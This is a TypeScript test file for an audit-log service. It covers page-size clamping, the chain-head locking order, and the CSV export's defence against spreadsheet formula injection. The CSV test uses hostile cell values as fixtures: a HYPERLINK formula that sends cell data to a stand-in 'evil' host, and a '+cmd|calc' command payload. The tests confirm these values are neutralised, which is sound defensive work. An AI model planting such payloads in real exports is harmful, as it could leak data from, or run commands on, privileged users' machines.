// @vitest-environment node

/**
 * The audit-log read surface over a recording fake of the postgres.js tag:
 * the page size that reaches `LIMIT` (every door pages through
 * `listAuditLogs`, so the clamp lives there) and the CSV export's
 * neutralisation of spreadsheet-formula cells — the export's reader is the
 * org's most privileged one, and titles and e-mails are member-authored.
 */

import {
  RETRY_QUEUE_LOCK_CLASS,
  retryQueueKeyOf,
} from '@tale/shared/db/serializable';
import type { Sql, TransactionSql } from 'postgres';
import { describe, expect, it } from 'vitest';

import {
  auditChainQueueKey,
  buildAuditExport,
  createAuditLog,
  listAuditLogs,
} from './service.ts';
import type { AuditLogRow } from './types.ts';

interface Statement {
  text: string;
  values: unknown[];
}

function fakeSql(rows: unknown[] = []): { sql: Sql; statements: Statement[] } {
  const statements: Statement[] = [];
  const tag = (strings: TemplateStringsArray, ...values: unknown[]) => {
    let text = '';
    const flat: unknown[] = [];
    strings.forEach((part, index) => {
      text += part;
      if (index >= values.length) return;
      const value = values[index];
      if (
        typeof value === 'object' &&
        value !== null &&
        'unsafeText' in value
      ) {
        text += String(value.unsafeText);
      } else {
        text += '?';
        flat.push(value);
      }
    });
    text = text.replace(/\s+/g, ' ').trim();
    statements.push({ text, values: flat });
    return Promise.resolve(rows);
  };
  tag.unsafe = (text: string) => ({ unsafeText: text });
  return { sql: tag as unknown as Sql, statements };
}

/**
 * Recording fake of a transaction tag whose answer depends on the statement
 * — the chain-head lock returns a head, the audit INSERT an id, and a
 * responder may throw to stand in for a Postgres error.
 */
function fakeTx(respond: (statement: Statement) => unknown[]): {
  tx: TransactionSql;
  statements: Statement[];
} {
  const statements: Statement[] = [];
  const tag = (strings: TemplateStringsArray, ...values: unknown[]) => {
    const text = strings
      .reduce(
        (acc, part, index) =>
          `${acc}${part}${index < values.length ? '?' : ''}`,
        '',
      )
      .replace(/\s+/g, ' ')
      .trim();
    const statement = { text, values };
    statements.push(statement);
    try {
      return Promise.resolve(respond(statement));
    } catch (error) {
      return Promise.reject(error);
    }
  };
  tag.unsafe = (text: string) => ({ unsafeText: text });
  return { tx: tag as unknown as TransactionSql, statements };
}

function sqlstateError(code: string): Error {
  const error: Error & { code?: string } = new Error(`sqlstate ${code}`);
  error.code = code;
  return error;
}

function limitOf(statements: Statement[]): unknown {
  const query = statements.find((s) => s.text.includes('FROM app.audit_logs'));
  return query?.values.at(-1);
}

describe('listAuditLogs — page size', () => {
  it.each([
    [-5, 2],
    [0, 2],
    [2.7, 3],
    [50, 51],
    [10_000, 201],
  ])(
    'clamps limit %s to a LIMIT of %s (page + 1 lookahead)',
    async (limit, expected) => {
      const fake = fakeSql();
      await listAuditLogs(fake.sql, 'org_1', { limit });
      expect(limitOf(fake.statements)).toBe(expected);
    },
  );

  it('defaults to 50', async () => {
    const fake = fakeSql();
    await listAuditLogs(fake.sql, 'org_1');
    expect(limitOf(fake.statements)).toBe(51);
  });
});

describe('buildAuditExport — CSV', () => {
  const row = (overrides: Partial<AuditLogRow>): AuditLogRow => ({
    id: 'a1',
    organizationId: 'org_1',
    actorId: 'u1',
    actorEmail: null,
    actorEmailHash: null,
    actorRole: null,
    actorType: 'user',
    action: 'document.rename',
    category: 'data',
    resourceType: 'document',
    resourceId: 'd1',
    resourceName: null,
    previousState: null,
    newState: null,
    changedFields: null,
    sessionId: null,
    ipAddress: null,
    actorIpHash: null,
    userAgent: null,
    requestId: null,
    timestamp: 0,
    status: 'success',
    errorMessage: null,
    metadata: null,
    integrityHash: 'h',
    previousHash: null,
    piiScrubbed: null,
    ...overrides,
  });

  it('neutralises formula prefixes in member-authored cells', async () => {
    const fake = fakeSql([
      row({
        resourceName: '=HYPERLINK("http://evil/"&A1,"x")',
        actorEmail: '+cmd|calc',
        errorMessage: '-1+1',
      }),
      row({ id: 'a2', resourceName: '@SUM(A1)' }),
      row({ id: 'a3', resourceName: '\tsneaky' }),
      row({ id: 'a4', resourceName: 'Quarterly report, final' }),
    ]);

    const built = await buildAuditExport(fake.sql, 'org_1', { format: 'csv' });
    const lines = built.content.split('\n');

    expect(lines[1]).toContain(`"'=HYPERLINK(""http://evil/""&A1,""x"")"`);
    expect(lines[1]).toContain(`'+cmd|calc`);
    expect(lines[1]).toContain(`'-1+1`);
    expect(lines[2]).toContain(`'@SUM(A1)`);
    expect(lines[3]).toContain(`'\tsneaky`);
    // Ordinary text is untouched — quoted only for the comma.
    expect(lines[4]).toContain('"Quarterly report, final"');
    expect(lines[4]).not.toContain("'Quarterly");
  });
});

describe('createAuditLog — chain-head lock', () => {
  const args = {
    organizationId: 'org_1',
    actorId: 'u1',
    actorType: 'user' as const,
    action: 'document.rename',
    category: 'data' as const,
    resourceType: 'document',
    resourceId: 'd1',
    status: 'success' as const,
  };
  const headResponder =
    (atHeadLock: () => unknown[]) =>
    (statement: Statement): unknown[] => {
      if (statement.text.includes('FOR UPDATE')) {
        return atHeadLock();
      }
      if (statement.text.includes('INSERT INTO app.audit_logs')) {
        return [{ id: 'a1' }];
      }
      return [];
    };

  it("takes the org's queue lock before it touches the head row", async () => {
    const fake = fakeTx(headResponder(() => [{ lastHash: '', lastTs: 0 }]));
    await expect(createAuditLog(fake.tx, args)).resolves.toBe('a1');
    expect(fake.statements[0]).toEqual({
      text: 'SELECT pg_advisory_xact_lock(?, hashtext(?))',
      values: [RETRY_QUEUE_LOCK_CLASS, auditChainQueueKey('org_1')],
    });
    expect(fake.statements[1]?.text).toContain(
      'INSERT INTO app.audit_chain_heads',
    );
    expect(fake.statements[2]?.text).toContain('FOR UPDATE');
  });

  it("marks a serialization failure at the head with the org's queue key", async () => {
    const fake = fakeTx(
      headResponder(() => {
        throw sqlstateError('40001');
      }),
    );
    const failure = await createAuditLog(fake.tx, args).catch(
      (error: unknown) => error,
    );
    expect(retryQueueKeyOf(failure)).toBe(auditChainQueueKey('org_1'));
    expect(fake.statements.some((s) => s.text.includes('audit_logs'))).toBe(
      false,
    );
  });

  it('leaves other failures unmarked', async () => {
    const fake = fakeTx(
      headResponder(() => {
        throw sqlstateError('23505');
      }),
    );
    const failure = await createAuditLog(fake.tx, args).catch(
      (error: unknown) => error,
    );
    expect(failure).toBeInstanceOf(Error);
    expect(retryQueueKeyOf(failure)).toBeUndefined();
  });
});
